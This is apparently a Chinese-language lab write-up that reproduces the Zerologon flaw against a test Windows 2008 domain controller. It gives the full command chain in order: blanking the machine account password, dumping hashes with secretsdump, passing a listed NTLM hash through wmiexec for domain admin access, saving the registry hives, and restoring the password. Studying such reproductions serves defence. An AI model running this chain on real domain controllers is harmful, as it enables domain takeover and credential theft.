本文仅做漏洞复现记录与实现，利用流程如下:

1.复现环境

win7跳板机IP：192.168.52.143

win2008域控IP: 192.168.52.138

2\. 利用过程

检测域控是否存在漏洞

python zerologon_tester.py owa 192.168.52.138

![1615446494_6049c1de8205417ef02f7.png!small](https://image.3001.net/images/20210311/1615446494_6049c1de8205417ef02f7.png!small)

使用漏洞利用工具将域控机器账户密码置空，该步骤可能会导致域控脱域，需要及时恢复hash

python set_empty_pw.py owa 192.168.52.138

![1615447795_6049c6f32c892fe657343.png!small](https://image.3001.net/images/20210311/1615447795_6049c6f32c892fe657343.png!small)

之后使用空密码将域控的hash下载

python secretsdump.py god.org/"owa$"@192.168.52.138 -no-pass

![1615447861_6049c73575229a249e981.png!small](https://image.3001.net/images/20210311/1615447861_6049c73575229a249e981.png!small)

之后使用hash通过wmiexec.py获取域管权限

python wmiexec.py -hashes
aad3b435b51404eeaad3b435b51404ee:81be2f80d568100549beac645d6a7141
[administrator@192.168.52.138](mailto:administrator@192.168.52.138)

![1615448280_6049c8d81a99d6c9c610a.png!small](https://image.3001.net/images/20210311/1615448280_6049c8d81a99d6c9c610a.png!small)

执行以下命令，获取目标原始hash

reg save HKLM\SYSTEM system.save

reg save HKLM\SAM sam.save

reg save HKLM\SECURITY security.save

![1615448280_6049c8d851f9d9dda29a3.png!small](https://image.3001.net/images/20210311/1615448280_6049c8d851f9d9dda29a3.png!small)

将其下载下来

get system.save

get sam.save

get security.save

之后将获取其置空前hash

python secretsdump.py -sam sam.save -system system.save -security
security.save LOCAL

![1615448295_6049c8e7cc2d1cb98defe.png!small](https://image.3001.net/images/20210311/1615448295_6049c8e7cc2d1cb98defe.png!small)

恢复域控hash

python reinstall_original_pw.py owa 192.168.52.138
75c1f14a63ee00aef8a5200eeff2bf88

![1615448280_6049c8d851277d69a2943.png!small](https://image.3001.net/images/20210311/1615448280_6049c8d851277d69a2943.png!small)

使用空密码验证连接

![1615448280_6049c8d84518f19a2e58b.png!small](https://image.3001.net/images/20210311/1615448280_6049c8d84518f19a2e58b.png!small)

域控hash已经恢复

